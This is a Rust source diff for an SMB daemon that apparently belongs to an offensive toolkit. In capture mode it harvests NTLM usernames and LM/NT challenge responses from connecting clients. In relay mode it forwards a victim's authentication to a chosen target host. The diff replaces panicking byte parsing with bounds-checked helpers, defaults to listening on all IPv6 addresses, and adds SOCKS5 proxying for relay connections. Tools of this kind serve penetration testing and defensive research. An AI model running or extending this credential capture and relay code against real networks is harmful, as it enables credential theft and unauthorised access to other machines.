@@ -17,8 +17,10 @@ use aes::Aes128;
 use cmac::Cmac;
 use hmac::{Hmac, Mac};
 use sha2::{Digest, Sha256, Sha512};
+use std::net::SocketAddr;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex};
+use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::{TcpListener, TcpStream};
 use tracing::{debug, info, warn};
@@ -69,6 +71,26 @@ const SHARE_TYPE_PIPE: u8 = 0x02;
 const OPLOCK_LEVEL_NONE: u8 = 0x00;
 const FILE_OPEN: u32 = 0x0001;
 
+/// Safely read a u16 from a byte slice at the given offset.
+/// Returns None if the slice is too short.
+fn read_u16_le(data: &[u8], offset: usize) -> Option<u16> {
+    data.get(offset..offset + 2).map(|b| u16::from_le_bytes([b[0], b[1]]))
+}
+
+/// Safely read a u32 from a byte slice at the given offset.
+/// Returns None if the slice is too short.
+fn read_u32_le(data: &[u8], offset: usize) -> Option<u32> {
+    data.get(offset..offset + 4)
+        .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
+}
+
+/// Safely read a u64 from a byte slice at the given offset.
+/// Returns None if the slice is too short.
+fn read_u64_le(data: &[u8], offset: usize) -> Option<u64> {
+    data.get(offset..offset + 8)
+        .map(|b| u64::from_le_bytes([b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]]))
+}
+
 // ===========================================================
 // Configuration
 // ===========================================================
@@ -89,16 +111,19 @@ pub struct SmbDaemonConfig {
     pub challenge: Option<[u8; 8]>,
     pub mode: SmbDaemonMode,
     pub domain_name: String,
+    /// Optional SOCKS5 proxy for outbound relay connections (format: `host:port`).
+    pub socks5_proxy: Option<String>,
 }
 
 impl Default for SmbDaemonConfig {
     fn default() -> Self {
         Self {
-            listen_ip: "0.0.0.0".into(),
+            listen_ip: "::".into(),
             listen_port: 445,
             challenge: None,
             mode: SmbDaemonMode::Capture,
             domain_name: "LAN".into(),
+            socks5_proxy: None,
         }
     }
 }
@@ -306,14 +331,14 @@ impl SmbDaemon {
                 break;
             }
 
-            let command = u16::from_le_bytes([data[smb2_start + 12], data[smb2_start + 13]]);
-            let message_id = u64::from_le_bytes(
-                (0..8)
-                    .map(|i| data[smb2_start + 24 + i])
-                    .collect::<Vec<_>>()
-                    .try_into()
-                    .unwrap(),
-            );
+            let command = match read_u16_le(&data[smb2_start..], 12) {
+                Some(c) => c,
+                None => break,
+            };
+            let message_id = match read_u64_le(&data[smb2_start..], 24) {
+                Some(id) => id,
+                None => break,
+            };
 
             debug!(
                 "SMB command 0x{:04X} mid {} from {}",
@@ -537,8 +562,9 @@ impl SmbDaemon {
             resp[neg_ctx_offset_field_pos + 4] = count_bytes[0];
             resp[neg_ctx_offset_field_pos + 5] = count_bytes[1];
 
-            if salt_field_pos + 32 <= resp.len() && session.client_preauth_salt.is_some() {
-                let client_salt = session.client_preauth_salt.clone().unwrap();
+            if salt_field_pos + 32 <= resp.len()
+                && let Some(client_salt) = session.client_preauth_salt.clone()
+            {
                 for i in 0..32 {
                     resp[salt_field_pos + i] = 0;
                 }
@@ -603,7 +629,13 @@ impl SmbDaemon {
                     target_port,
                 } = &config.mode
                 {
-                    match Self::relay_negotiate_and_type1(target_host, *target_port, session, data)
+                    match Self::relay_negotiate_and_type1(
+                            target_host,
+                            *target_port,
+                            session,
+                            data,
+                            config.socks5_proxy.as_deref(),
+                        )
                         .await
                     {
                         Ok((challenge_blob, relay_sess)) => {
@@ -803,13 +835,10 @@ impl SmbDaemon {
         if body.len() < 24 {
             return (STATUS_INVALID_PARAMETER, vec![]);
         }
-        let persistent_id = u64::from_le_bytes(
-            (0..8)
-                .map(|i| body[16 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let persistent_id = match read_u64_le(body, 16) {
+            Some(id) => id,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
         session
             .open_files
             .retain(|f| f.persistent_id != persistent_id);
@@ -823,20 +852,14 @@ impl SmbDaemon {
         if body.len() < 24 {
             return (STATUS_INVALID_PARAMETER, vec![]);
         }
-        let read_len = u32::from_le_bytes(
-            (0..4)
-                .map(|i| body[4 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
-        let persistent_id = u64::from_le_bytes(
-            (0..8)
-                .map(|i| body[16 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let read_len = match read_u32_le(body, 4) {
+            Some(len) => len,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
+        let persistent_id = match read_u64_le(body, 16) {
+            Some(id) => id,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
         let data_buf = session
             .open_files
             .iter()
@@ -860,21 +883,18 @@ impl SmbDaemon {
         if body.len() < 24 {
             return (STATUS_INVALID_PARAMETER, vec![]);
         }
-        let data_off = u16::from_le_bytes([body[2], body[3]]) as usize;
-        let data_len = u32::from_le_bytes(
-            (0..4)
-                .map(|i| body[4 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
-        let persistent_id = u64::from_le_bytes(
-            (0..8)
-                .map(|i| body[16 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let data_off = match read_u16_le(body, 2) {
+            Some(off) => off as usize,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
+        let data_len = match read_u32_le(body, 4) {
+            Some(len) => len,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
+        let persistent_id = match read_u64_le(body, 16) {
+            Some(id) => id,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
         if data_off + data_len as usize <= data.len() {
             let wdata = data[data_off..data_off + data_len as usize].to_vec();
             if let Some(file) = session
@@ -902,34 +922,22 @@ impl SmbDaemon {
             return (STATUS_INVALID_PARAMETER, vec![]);
         }
 
-        let ctl_code = u32::from_le_bytes(
-            (0..4)
-                .map(|i| body[4 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
-        let input_off = u32::from_le_bytes(
-            (0..4)
-                .map(|i| body[20 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
-        let input_len = u32::from_le_bytes(
-            (0..4)
-                .map(|i| body[24 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
-        let max_output = u32::from_le_bytes(
-            (0..4)
-                .map(|i| body[36 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let ctl_code = match read_u32_le(body, 4) {
+            Some(code) => code,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
+        let input_off = match read_u32_le(body, 20) {
+            Some(off) => off,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
+        let input_len = match read_u32_le(body, 24) {
+            Some(len) => len,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
+        let max_output = match read_u32_le(body, 36) {
+            Some(max) => max,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
 
         if ctl_code != FSCTL_PIPE_TRANSCEIVE {
             debug!("Unsupported IOCTL code 0x{:08X}", ctl_code);
@@ -994,9 +1002,14 @@ impl SmbDaemon {
         target_port: u16,
         _session: &SmbClientSession,
         victim_negotiate: &[u8],
+        socks5_proxy: Option<&str>,
     ) -> Result<(Vec<u8>, SmbRelaySession)> {
         let addr = crate::utils::format_addr(target_host, target_port);
-        let mut stream = TcpStream::connect(&addr)
+        let target: SocketAddr = addr
+            .parse()
+            .map_err(|e| RelayError::Socket(format!("invalid relay address '{}': {}", addr, e)))?;
+        let timeout = Duration::from_secs(30);
+        let mut stream = crate::utils::socks5_connect(target, timeout, socks5_proxy)
             .await
             .map_err(|e| RelayError::Socket(format!("relay connect to {}: {}", addr, e)))?;
 
@@ -1043,13 +1056,10 @@ impl SmbDaemon {
         if target_data.len() < smb2_start + SMB2_HEADER_SIZE + 8 {
             return Err(RelayError::Config("Short relay session setup response".into()).into());
         }
-        let target_status = u32::from_le_bytes(
-            (0..4)
-                .map(|i| target_data[smb2_start + 8 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let target_status = match read_u32_le(&target_data[smb2_start..], 8) {
+            Some(s) => s,
+            None => return Err(RelayError::Config("Short relay response (status)".into()).into()),
+        };
 
         if target_status != STATUS_MORE_PROCESSING_REQUIRED {
             return Err(
@@ -1071,13 +1081,10 @@ impl SmbDaemon {
             return Err(RelayError::Config("No NTLM challenge in relay response".into()).into());
         }
 
-        let target_session_id = u64::from_le_bytes(
-            (0..8)
-                .map(|i| target_data[smb2_start + 44 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let target_session_id = match read_u64_le(&target_data[smb2_start..], 44) {
+            Some(id) => id,
+            None => return Err(RelayError::Config("Short relay response (session id)".into()).into()),
+        };
 
         let relay_sess = SmbRelaySession {
             stream,
@@ -1125,13 +1132,10 @@ impl SmbDaemon {
         if target_data.len() < smb2_start + SMB2_HEADER_SIZE + 8 {
             return Err(RelayError::Config("Short relay auth3 response".into()).into());
         }
-        let target_status = u32::from_le_bytes(
-            (0..4)
-                .map(|i| target_data[smb2_start + 8 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let target_status = match read_u32_le(&target_data[smb2_start..], 8) {
+            Some(s) => s,
+            None => return Err(RelayError::Config("Short relay auth3 response (status)".into()).into()),
+        };
         if target_status != STATUS_SUCCESS {
             return Err(RelayError::Config(format!(
                 "Target auth failed with status 0x{:08X}",
@@ -1140,13 +1144,10 @@ impl SmbDaemon {
             .into());
         }
 
-        let target_session_id = u64::from_le_bytes(
-            (0..8)
-                .map(|i| target_data[smb2_start + 44 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let target_session_id = match read_u64_le(&target_data[smb2_start..], 44) {
+            Some(id) => id,
+            None => return Err(RelayError::Config("Short relay auth3 response (session id)".into()).into()),
+        };
 
         // Extract session key from the target's response security buffer
         let target_body = &target_data[smb2_start + SMB2_HEADER_SIZE..];
@@ -1194,21 +1195,14 @@ impl SmbDaemon {
         if resp.len() < smb2_start + SMB2_HEADER_SIZE + 2 {
             return (STATUS_LOGON_FAILURE, vec![]);
         }
-        let status = u32::from_le_bytes(
-            (0..4)
-                .map(|i| resp[smb2_start + 8 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
-        if status == STATUS_SUCCESS {
-            relay.tree_id = u32::from_le_bytes(
-                (0..4)
-                    .map(|i| resp[smb2_start + 40 + i])
-                    .collect::<Vec<_>>()
-                    .try_into()
-                    .unwrap(),
-            );
+        let status = match read_u32_le(&resp[smb2_start..], 8) {
+            Some(s) => s,
+            None => return (STATUS_LOGON_FAILURE, vec![]),
+        };
+        if status == STATUS_SUCCESS
+            && let Some(tid) = read_u32_le(&resp[smb2_start..], 40)
+        {
+            relay.tree_id = tid;
         }
         let resp_body = if resp.len() > smb2_start + SMB2_HEADER_SIZE {
             resp[smb2_start + SMB2_HEADER_SIZE..].to_vec()
@@ -1246,13 +1240,10 @@ impl SmbDaemon {
         if resp.len() < smb2_start + SMB2_HEADER_SIZE + 2 {
             return (STATUS_LOGON_FAILURE, vec![]);
         }
-        let status = u32::from_le_bytes(
-            (0..4)
-                .map(|i| resp[smb2_start + 8 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let status = match read_u32_le(&resp[smb2_start..], 8) {
+            Some(s) => s,
+            None => return (STATUS_LOGON_FAILURE, vec![]),
+        };
         // Extract file id from create response (bytes 60-75 of body)
         if status == STATUS_SUCCESS && resp.len() > smb2_start + SMB2_HEADER_SIZE + 76 {
             let mut fid = [0u8; 16];
@@ -1301,13 +1292,10 @@ impl SmbDaemon {
         if resp.len() < smb2_start + SMB2_HEADER_SIZE + 2 {
             return (STATUS_LOGON_FAILURE, vec![]);
         }
-        let status = u32::from_le_bytes(
-            (0..4)
-                .map(|i| resp[smb2_start + 8 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        );
+        let status = match read_u32_le(&resp[smb2_start..], 8) {
+            Some(s) => s,
+            None => return (STATUS_LOGON_FAILURE, vec![]),
+        };
         let resp_body = if resp.len() > smb2_start + SMB2_HEADER_SIZE {
             resp[smb2_start + SMB2_HEADER_SIZE..].to_vec()
         } else {
@@ -1485,7 +1473,9 @@ impl SmbDaemon {
                 // Output length in bits as 32-bit big-endian
                 input.extend_from_slice(&128u32.to_be_bytes());
 
-                let mut mac = Hmac::<Sha256>::new_from_slice(session_key).unwrap();
+                let Ok(mut mac) = Hmac::<Sha256>::new_from_slice(session_key) else {
+                    return session_key.to_vec();
+                };
                 mac.update(&input);
                 let result = mac.finalize().into_bytes();
                 result[..16].to_vec() // 128-bit key
@@ -1516,7 +1506,11 @@ impl SmbDaemon {
         match session.dialect {
             SMB2_DIALECT_202 | SMB2_DIALECT_210 => {
                 // SMB 2.x: HMAC-SHA256 truncated to 16 bytes
-                let mut mac = Hmac::<Sha256>::new_from_slice(signing_key).unwrap();
+                let Ok(mut mac) = Hmac::<Sha256>::new_from_slice(signing_key) else {
+                    // Fallback: restore saved signature
+                    pkt[sig_start..sig_start + 16].copy_from_slice(&saved);
+                    return;
+                };
                 mac.update(pkt);
                 let result = mac.finalize().into_bytes();
                 pkt[sig_start..sig_start + 16].copy_from_slice(&result[..16]);
@@ -1756,13 +1750,10 @@ impl SmbDaemon {
         }
         let field = |offset: usize| -> String {
             let len = u16::from_le_bytes([ntlmssp[offset], ntlmssp[offset + 1]]) as usize;
-            let buf_off = u32::from_le_bytes(
-                (0..4)
-                    .map(|i| ntlmssp[offset + 4 + i])
-                    .collect::<Vec<_>>()
-                    .try_into()
-                    .unwrap(),
-            ) as usize;
+            let buf_off = match read_u32_le(ntlmssp, offset + 4) {
+                Some(off) => off as usize,
+                None => return String::new(),
+            };
             if len > 0 && buf_off + len <= ntlmssp.len() {
                 let bytes = &ntlmssp[buf_off..buf_off + len];
                 String::from_utf16_lossy(
@@ -1779,13 +1770,10 @@ impl SmbDaemon {
         let username = field(36);
 
         let lm_len = u16::from_le_bytes([ntlmssp[12], ntlmssp[13]]) as usize;
-        let lm_off = u32::from_le_bytes(
-            (0..4)
-                .map(|i| ntlmssp[16 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        ) as usize;
+        let lm_off = match read_u32_le(ntlmssp, 16) {
+            Some(off) => off as usize,
+            None => return,
+        };
         let lm_response = if lm_len > 0 && lm_off + lm_len <= ntlmssp.len() {
             hex::encode(&ntlmssp[lm_off..lm_off + lm_len])
         } else {
@@ -1793,13 +1781,10 @@ impl SmbDaemon {
         };
 
         let nt_len = u16::from_le_bytes([ntlmssp[20], ntlmssp[21]]) as usize;
-        let nt_off = u32::from_le_bytes(
-            (0..4)
-                .map(|i| ntlmssp[24 + i])
-                .collect::<Vec<_>>()
-                .try_into()
-                .unwrap(),
-        ) as usize;
+        let nt_off = match read_u32_le(ntlmssp, 24) {
+            Some(off) => off as usize,
+            None => return,
+        };
         let nt_response = if nt_len > 0 && nt_off + nt_len <= ntlmssp.len() {
             hex::encode(&ntlmssp[nt_off..nt_off + nt_len])
         } else {
